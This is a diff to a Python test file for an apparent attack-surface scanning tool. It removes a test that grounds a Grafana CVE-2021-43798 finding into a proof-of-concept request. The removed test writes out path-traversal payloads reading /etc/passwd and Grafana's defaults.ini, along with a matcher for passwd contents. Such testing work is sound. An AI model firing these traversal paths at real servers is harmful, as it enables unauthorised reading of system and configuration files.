@@ -88,47 +88,6 @@ def test_grounding_attaches_a_poc_request_only_for_an_observed_safe_read():
     assert by_id["f1"] is not grounded
 
 
-def test_a_versioned_cve_finding_grounds_on_the_recipe_across_every_candidate_path():
-    """A known-vulnerability finding whose CVE the lookup tied to the running version grounds on the
-    recipe: every candidate path becomes a url, the recipe's headers and matchers ride into the
-    request, and the generated script decides PASS or FAIL by the recipe's own fire condition."""
-    from opfor.core import Fact
-    from opfor.scenarios.attacksurface.assets.domain.types import (
-        CVE, CVEScan, DomainData, HTTPProbe)
-    from opfor.scenarios.attacksurface.assets.domain.nuclei import Matcher
-    from opfor.core.result import Finding
-    from opfor.scenarios.attacksurface.assets.domain.grounding import (
-        FindingGrounder, ReproductionRecipe)
-
-    world = World()
-    world.add(Node(id="domain:g.example.com", type="domain",
-                   payload=DomainData(name="g.example.com", root="example.com", source="crt")))
-    world.absorb([Fact(kind="http", about="domain:g.example.com",
-                       payload=HTTPProbe(alive=True, status=200, url="https://g.example.com/"))])
-    world.absorb([Fact(kind="cve_scan", about="domain:g.example.com", payload=CVEScan(
-        product="Grafana", version="8.3.0", match="version",
-        cves=(CVE(id="CVE-2021-43798"),)))])
-    recipe = ReproductionRecipe(
-        cve="CVE-2021-43798", method="GET",
-        paths=("/public/plugins/alertlist/../../../etc/passwd", "/public/plugins/alertlist/../../../conf/defaults.ini"),
-        expect="a file read confirms the traversal",
-        matchers=(Matcher(type="regex", part="body", values=("root:.*:0:",), condition="or"),
-                  Matcher(type="status", part="body", values=("200",), condition="or")),
-        matchers_condition="and")
-    finding = Finding(id="v1", title="Grafana CVE-2021-43798 path traversal", severity="HIGH",
-                      where="https://g.example.com", data={"kind": "known-vulnerability"})
-
-    out = FindingGrounder(reproductions=(recipe,)).run(world, (finding,))
-    req = out[0].data["poc_request"]
-    assert req["urls"] == [
-        "https://g.example.com/public/plugins/alertlist/../../../etc/passwd",
-        "https://g.example.com/public/plugins/alertlist/../../../conf/defaults.ini"]
-    assert req["source"] == "reproduction:CVE-2021-43798"
-    assert {"type": "status", "part": "body", "values": ["200"], "condition": "or"} in req["matchers"]
-    assert req["script"] == "poc/cve-2021-43798-g-example-com.py"
-    script = out[0].data["poc_script"]
-    assert "root:.*:0:" in script and "defaults.ini" in script
-    compile(script, "<poc>", "exec")
 
 
 def test_triage_judge_mints_findings_and_mutates_no_world_node():
